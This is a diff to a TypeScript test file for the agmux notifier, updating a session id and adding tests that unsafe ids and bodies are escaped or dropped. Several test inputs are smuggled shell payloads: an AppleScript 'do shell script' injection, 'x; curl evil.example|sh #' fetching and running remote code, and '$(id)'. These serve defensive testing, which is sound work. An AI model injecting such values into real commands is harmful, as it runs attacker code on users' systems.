@@ -1,7 +1,7 @@
 import { test, expect } from "bun:test";
 import { resolveNotifier, buildNotifyArgv, type NotifySpec } from "../src/notifier.ts";
 
-const SPEC: NotifySpec = { title: "agmux", body: "work:2 needs permission", sound: "Ping", attachId: "agx-1" };
+const SPEC: NotifySpec = { title: "agmux", body: "work:2 needs permission", sound: "Ping", attachId: "0198abcd-1234-7000-8000-000000000001" };
 
 test("auto prefers terminal-notifier when present", () => {
   expect(resolveNotifier("auto", (b) => b === "terminal-notifier")).toBe("terminal-notifier");
@@ -36,7 +36,7 @@ test("terminal-notifier argv carries sound and a click-to-attach execute action"
   expect(cmd).toBe("terminal-notifier");
   expect(args).toContain("-sound");
   expect(args).toContain("Ping");
-  expect(args.join(" ")).toContain("agmux attach agx-1");
+  expect(args.join(" ")).toContain("agmux attach 0198abcd-1234-7000-8000-000000000001");
 });
 
 test("osascript argv embeds sound and escapes double quotes in the body", () => {
@@ -55,7 +55,7 @@ test("a null sound omits the sound clause entirely", () => {
 test("a custom command substitutes the documented variables", () => {
   const { cmd, args } = buildNotifyArgv("custom", SPEC, "/bin/n --title {title} --body {body} --id {session_id}");
   expect(cmd).toBe("/bin/n");
-  expect(args).toEqual(["--title", "agmux", "--body", "work:2 needs permission", "--id", "agx-1"]);
+  expect(args).toEqual(["--title", "agmux", "--body", "work:2 needs permission", "--id", "0198abcd-1234-7000-8000-000000000001"]);
 });
 
 test("a blank configured string resolves to null", () => {
@@ -88,4 +88,15 @@ test("osascript escapes an AppleScript injection attempt", () => {
   const { args } = buildNotifyArgv("osascript", { ...SPEC, body: '" & (do shell script "id") & "' });
   // All quotes should be escaped, keeping the injection attempt inside the string literal
   expect(args[1]).toContain('\\" & (do shell script \\"id\\") & \\"');
+});
+
+test("terminal-notifier omits the -execute action for an id with shell metacharacters", () => {
+  const { args } = buildNotifyArgv("terminal-notifier", { ...SPEC, attachId: "x; curl evil.example|sh #" });
+  expect(args).not.toContain("-execute");
+  expect(args.join(" ")).not.toContain("curl");
+});
+
+test("a custom command gets an empty {session_id} for an unsafe id", () => {
+  const { args } = buildNotifyArgv("custom", { ...SPEC, attachId: "$(id)" }, "/bin/n --id {session_id}");
+  expect(args).toEqual(["--id", ""]);
 });
